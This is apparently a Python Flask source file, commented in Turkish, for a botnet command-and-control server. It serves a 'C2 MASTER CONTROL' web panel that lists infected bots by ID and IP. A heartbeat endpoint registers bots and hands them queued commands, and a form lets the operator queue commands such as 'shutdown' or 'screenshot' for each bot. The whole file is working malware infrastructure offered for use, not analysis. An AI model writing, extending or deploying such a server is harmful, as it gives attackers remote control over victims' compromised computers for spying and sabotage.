from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

# Botların veritabanı (RAM üzerinde)
bots = {}
commands = {}

# HTML Web Paneli (Tek dosyada)
HTML_PANEL = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 COMMAND CENTER</title>
    <style>
        body { background-color: #0f0f0f; color: #00ff00; font-family: monospace; padding: 20px; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #333; padding: 10px; text-align: left; }
        th { background-color: #222; }
        .offline { color: red; } .online { color: lime; }
        input { background: #222; border: 1px solid #444; color: white; padding: 5px; width: 300px; }
        button { background: #00ff00; color: black; border: none; padding: 5px 15px; cursor: pointer; }
    </style>
</head>
<body>
    <h1>💀 C2 MASTER CONTROL</h1>
    <h3>Aktif Botlar</h3>
    <table>
        <tr><th>Bot ID</th><th>IP Adresi</th><th>Son Görülme</th><th>Durum</th><th>Komut Gönder</th></tr>
        {% for bot_id, info in bots.items() %}
        <tr>
            <td>{{ bot_id }}</td>
            <td>{{ info['ip'] }}</td>
            <td>{{ info['last_seen'] }}</td>
            <td class="online">ONLINE</td>
            <td>
                <form action="/command" method="POST">
                    <input type="hidden" name="bot_id" value="{{ bot_id }}">
                    <input type="text" name="cmd" placeholder="örn: shutdown, screenshot...">
                    <button type="submit">GÖNDER</button>
                </form>
            </td>
        </tr>
        {% endfor %}
    </table>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PANEL, bots=bots)

# Botların "Ben buradayım" dediği yer (Heartbeat)
@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    data = request.json
    bot_id = data.get('id')
    bots[bot_id] = {
        'ip': request.remote_addr,
        'last_seen': datetime.datetime.now().strftime("%H:%M:%S")
    }
    
    # Bekleyen komut var mı?
    if bot_id in commands:
        cmd = commands.pop(bot_id)
        return {"command": cmd}
    
    return {"command": "sleep"}

@app.route('/command', methods=['POST'])
def send_command():
    bot_id = request.form.get('bot_id')
    cmd = request.form.get('cmd')
    commands[bot_id] = cmd
    return f"Komut kuyruğa alındı: {cmd} -> {bot_id} <br><a href='/'>Geri Dön</a>"

if __name__ == '__main__':
    print("💀 C2 Sunucusu Başlatıldı: http://127.0.0.1:5000")
    print("Botlar '/heartbeat' adresine POST atmalı.")
    app.run(port=5000)